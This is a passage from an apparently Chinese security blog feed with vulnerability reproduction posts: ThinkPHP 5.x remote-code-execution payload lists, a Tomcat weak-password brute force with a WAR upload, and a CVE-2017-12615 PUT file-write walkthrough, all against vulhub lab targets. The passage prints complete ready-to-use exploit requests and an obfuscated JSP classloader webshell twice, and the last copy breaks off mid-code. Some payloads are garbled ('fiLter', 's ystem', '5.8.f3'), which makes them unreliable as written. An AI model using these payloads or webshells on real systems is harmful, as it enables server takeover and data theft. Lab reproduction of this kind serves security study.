&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">thinkconfig&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">database&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">username&lt;/span> &lt;span class="c1"># 获取配置信息&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">thinkLang&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">Load&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">fiLe&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">test&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">jpg&lt;/span> &lt;span class="c1"># 包含任意⽂件&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">thinkConfig&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">Load&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">fiLe&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">t&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">php&lt;/span> &lt;span class="c1"># 包含任意.php⽂件&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">thinkapp&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">invokefunction&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">function&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">caLL_user_func_array&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">vars&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">s&lt;/span> &lt;span class="n">ystem&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">vars&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="p">][]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">id&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="n">thinkapp&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">invokefunction&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">function&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">caLL_user_func_array&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">vars&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">s&lt;/span> &lt;span class="n">ystem&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">vars&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">whoami&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>5.0.13：&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;php.LocaL/thinkphp5.8.5/pubLic/index.php?s=index &lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">方法：&lt;/span>&lt;span class="n">post&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Body内容&lt;/span>&lt;span class="err">：&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">_method&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">_construct&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">fiLter&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">caLL_user_func&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">phpinfo&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">_method&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">_construct&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">fiLter&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">system&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">GET&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">whoami&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>其他&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ThinkPHP ≤ 5.8.f3 POST /?s=index/index&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">whoami&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">_method&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">_construct&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="o">=&amp;amp;&lt;/span>&lt;span class="n">fiLter&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">system&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ThinkPHP ≤ 5.8.23、5.f.8 ≤ 5.f.f6 需要开启框架app_debug &lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">POST&lt;/span> &lt;span class="o">/&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">_method&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">_construct&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">fiLter&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">system&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">server&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">REQUEST_METHOD&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">Ls&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">aL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ThinkPHP ≤ 5.8.23 需要存在xxx的method路由，例如captcha&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">POST&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">xxx&lt;/span> &lt;span class="n">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">f&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">_method&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">_construct&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">fiLter&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">system&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">Ls&lt;/span>&lt;span class="o">+-&lt;/span>&lt;span class="n">aL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">_method&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">_construct&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">fiLter&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">system&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">server&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">REQUEST_METHOD&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">L&lt;/span> &lt;span class="n">s&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>【Tomacat漏洞复现】后台弱口令+文件上传</title><link>http://localhost:1313/p/tomacat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%8E%E5%8F%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</link><pubDate>Thu, 04 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/tomacat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%8E%E5%8F%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</guid><description>&lt;img src="http://localhost:1313/images/35.webp" alt="Featured image of post 【Tomacat漏洞复现】后台弱口令+文件上传" />&lt;h1 id="影响范围">影响范围&lt;/h1>
&lt;p>Tomcat8&lt;/p>
&lt;h1 id="环境搭建">环境搭建&lt;/h1>
&lt;p>这边就还是用vulhub进行复现&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cd vulhub-master/tomcat/tomcat8
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo docker-compose up -d
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">docker ps
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">http://192.168.197.140:8080/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904141819.png" alt="image.png">&lt;/p>
&lt;h1 id="漏洞复现">漏洞复现&lt;/h1>
&lt;p>这里使用MSF进行复现：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">msfconsole
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904141926.png" alt="image.png">&lt;br>
&lt;strong>查找与 tomcat 相关的模块&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">search tomcat
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>使用 auxiliary/scanner/http/tomcat_mgr_login 模块&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">use auxiliary/scanner/http/tomcat_mgr_login
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>查看需要填写哪些参数&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">show options
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>将 rhosts 设置为目标机&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">set rhosts 172.16.2.174
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>进行爆破&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">run
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904142741.png" alt="image.png">&lt;br>
这里成功爆破出账号/密码：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">[+] 192.168.197.140:8080 - Login Successful: tomcat:tomcat
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>点击 Manager App 进行登录&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904155742.png" alt="image.png">&lt;br>
&lt;strong>登录后找到上传点&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904155816.png" alt="image.png">&lt;br>
将带有一句话的111.jsp文件压缩成zip，并且将压缩后的zip文件改名为111.war&lt;br>
jsp 一句话木马，密码为123&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">&amp;lt;% String H9991 = request.getParameter(&amp;#34;123&amp;#34;);if (H9991 != null) { class EdnMF480 extends/*Z#гдh*u@!h0S4OG4fI8*/ClassLoader { EdnMF480(ClassLoader L0YKXC) { super(L0YKXC); } public Class H9991(byte[] b) { return super.defineClass(b, 0, b.length);}}byte[] bytes = null;try {int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98}; String ccstr = &amp;#34;&amp;#34;;for (int i = 0; i &amp;lt; aa.length; i++) {aa[i] = aa[i] ^ 16; ccstr = ccstr + (char) aa[i];}Class A001M = Class.forName(ccstr);String k = new String(new byte[]{100,101,99,111,100,101,66,117,102,102,101,114});bytes = (byte[]) A001M.getMethod(k, String.class).invoke(A001M.newInstance(), H9991);}catch (Exception e) {bytes = javax.xml.bind.DatatypeConverter.parseBase64Binary(H9991);}Class aClass = new EdnMF480(Thread.currentThread().getContextClassLoader()).H9991(bytes);Object o = aClass.newInstance();o.equals(pageContext);} else {} %&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>上传111.war文件&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904160012.png" alt="image.png">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904160033.png" alt="image.png">&lt;br>
访问 172.16.2.174:8080/11/11.jsp，无任何回显。（这里我的码错了，方法都是一样的，我又重新上传了一下）&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904161029.png" alt="image.png">&lt;/p>
&lt;p>&lt;strong>上蚁剑&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://192.168.197.140:8080/11/11.jsp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">密码：pass
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904161012.png" alt="image.png">&lt;/p></description></item><item><title>【Tomcat漏洞复现】CVE-2017-12615任意文件写入</title><link>http://localhost:1313/p/tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2017-12615%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/</link><pubDate>Thu, 04 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2017-12615%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/</guid><description>&lt;img src="http://localhost:1313/images/34.webp" alt="Featured image of post 【Tomcat漏洞复现】CVE-2017-12615任意文件写入" />&lt;h1 id="漏洞详情">漏洞详情&lt;/h1>
&lt;p>当 Tomcat 运行在 Windows 系统且启用了 HTTP PUT 方法（通过将 &lt;code>readonly&lt;/code> 参数设置为 &lt;code>false&lt;/code>）时，攻击者可构造恶意请求上传 JSP 文件，导致服务器执行任意代码，进而引发数据泄露或服务器权限被控制。&lt;br>
&lt;strong>关键点：&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>&lt;strong>触发条件&lt;/strong>：需手动修改 &lt;code>conf/web.xml&lt;/code> 文件中的 &lt;code>readonly&lt;/code> 参数为 &lt;code>false&lt;/code>（默认值为 &lt;code>true&lt;/code>，PUT/DELETE 方法被禁用）。&lt;/li>
&lt;li>&lt;strong>绕过限制&lt;/strong>：Tomcat 默认通过 &lt;code>JspServlet&lt;/code> 处理 &lt;code>.jsp&lt;/code> 文件的上传，但攻击者可通过以下方式绕过限制，使文件由处理静态资源的 &lt;code>DefaultServlet&lt;/code> 处理：
&lt;ul>
&lt;li>文件名后添加空格（&lt;code>evil.jsp%20&lt;/code>，利用 Windows 不允许文件名以空格结尾的特性）。&lt;/li>
&lt;li>使用 NTFS 文件流特性（&lt;code>evil.jsp::$DATA&lt;/code>）。&lt;/li>
&lt;li>文件名后添加斜杠（&lt;code>evil.jsp/&lt;/code>，此方法甚至影响 Linux 系统及 Tomcat 5.x-9.x 版本）4711。&lt;br>
&lt;strong>影响范围：&lt;/strong>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>受影响的 Tomcat 版本&lt;/strong>：
&lt;ul>
&lt;li>Apache Tomcat 7.0.0 至 7.0.81（官方公告范围）。&lt;/li>
&lt;li>部分测试显示 Tomcat 8.5.19 等版本也可能受影响。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>操作系统&lt;/strong>：主要针对 Windows，但通过添加斜杠的绕过方式（&lt;code>evil.jsp/&lt;/code>）可扩展至 Linux 系统。&lt;br>
&lt;strong>攻击思路：&lt;/strong>&lt;br>
​ 上传木马文件，webshell管理工具进行连接&lt;/li>
&lt;/ul>
&lt;h1 id="环境搭建">环境搭建&lt;/h1>
&lt;p>使用vulhub进行搭建：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cd vulhub/tomcat/CVE-2017-12615
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">docker-compose up -d
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">docker ps
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">http://192.168.197.140:8080/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904133115.png" alt="image.png">&lt;/p>
&lt;h1 id="漏洞复现">漏洞复现&lt;/h1>
&lt;p>&lt;strong>burpsuite抓包&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904133228.png" alt="image.png">&lt;br>
使用&lt;code>webshell generate&lt;/code>快速生成木马，项目地址：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://github.com/cseroad/Webshell_Generate
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904133326.png" alt="image.png">&lt;br>
一句话木马：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">&amp;lt;% String H9991 = request.getParameter(&amp;#34;123&amp;#34;);if (H9991 != null) { class EdnMF480 extends/*Z#гдh*u@!h0S4OG4fI8*/ClassLoader { EdnMF480(ClassLoader L0YKXC) { super(L0YKXC); } public Class H9991(byte[] b) { return super.defineClass(b, 0, b.length);}}byte[] bytes = null;try {int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98}; String ccstr = &amp;#34;&amp;#34;;for (int i = 0; i &amp;lt; aa.length; i++) {aa[i] = aa[i] ^ 16; ccstr = ccstr + (char) aa[i];}Class A001M = Class.forName(ccstr);String k = new String(new byte[]{100,101,99,111,100,101,66,117,102,102,101,114});bytes = (byte[]) A001M.getMethod(k, String.class).invoke(A001M.newInstance(), H9991);}catch (Exception e) {bytes = javax.xml.bind.DatatypeConverter.parseBase64Binary(H9991);}Class aClass = new 